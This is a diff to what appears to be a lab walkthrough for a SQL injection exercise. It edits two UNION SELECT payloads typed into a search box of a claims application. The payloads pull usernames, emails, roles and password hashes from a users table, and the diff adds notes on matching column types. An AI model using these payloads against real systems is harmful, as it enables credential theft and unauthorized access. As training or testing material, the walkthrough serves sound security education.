@@ -109,7 +109,7 @@ If the page loads without a "Query error" flash message, the column count is cor
 Enter the following payload in the search box:
 
 ```
-x' UNION SELECT id::int, 0::int, 0::int, username, email, 0.0, role, created_at, NULL::timestamp, NULL::timestamp, NULL::int, NULL FROM users -- 
+x' UNION SELECT id::int, 0::int, 0::int, username, email, 0.0, role, created_at::text, NULL::timestamp, NULL::timestamp, NULL::int, NULL FROM users -- 
 ```
 
 > **Why these specific type casts?** The UNION must match the `claims` table's column types exactly:
@@ -117,19 +117,19 @@ x' UNION SELECT id::int, 0::int, 0::int, username, email, 0.0, role, created_at,
 > - `0::int` → matches `claims.user_id` and `claims.claim_type_id` (Integer)
 > - `username`, `email`, `role` → match VARCHAR/Text columns (no cast needed)
 > - `0.0` → matches `claims.amount` (Float)
-> - `created_at` → matches `claims.created_at` (DateTime)
-> - `NULL::timestamp` → matches DateTime columns
+> - `created_at::text` → matches `claims.additional_details` (Text) — timestamp cast to text
+> - `NULL::timestamp` → matches `claims.updated_at` (DateTime)
 > - `NULL::int` → matches `claims.reviewed_by` (Integer)
 
 This maps user data to the columns the template renders:
 
-| Template column        | Displays           | `users` value      |
-|------------------------|--------------------|--------------------| 
-| ID (`row[0]`)          | User ID            | `id::int`          |
-| Title (`row[3]`)       | **Username**       | `username`         |
-| Amount (`row[5]`)      | `0.0` placeholder  | `0.0`              |
-| Status (`row[6]`)      | **Role**           | `role`             |
-| Submitted (`row[7]`)   | **Created at**     | `created_at`       |
+| Template column        | Displays           | `users` value         |
+|------------------------|--------------------|-----------------------| 
+| ID (`row[0]`)          | User ID            | `id::int`             |
+| Title (`row[3]`)       | **Username**       | `username`            |
+| Amount (`row[5]`)      | `0.0` placeholder  | `0.0`                 |
+| Status (`row[6]`)      | **Role**           | `role`                |
+| Submitted (`row[7]`)   | **Created at**     | `created_at::text`    |
 
 Look for a row where the **Title** column shows `oic_admin` and the **Status** column shows `oic`.
 
@@ -138,7 +138,7 @@ Look for a row where the **Title** column shows `oic_admin` and the **Status** c
 The password hash cannot be placed in the Amount position (`row[5]`) because the non-raw template path tries to format it as a float (`"%.2f"|format(row[5])`). Use this separate payload to extract hashes:
 
 ```
-x' UNION SELECT id::int, 0::int, 0::int, password_hash, email, 0.0, role, created_at, NULL::timestamp, NULL::timestamp, NULL::int, NULL FROM users -- 
+x' UNION SELECT id::int, 0::int, 0::int, password_hash, email, 0.0, role, created_at::text, NULL::timestamp, NULL::timestamp, NULL::int, NULL FROM users -- 
 ```
 
 This places `password_hash` in the **Title** column (`row[3]`), which renders as plain text.
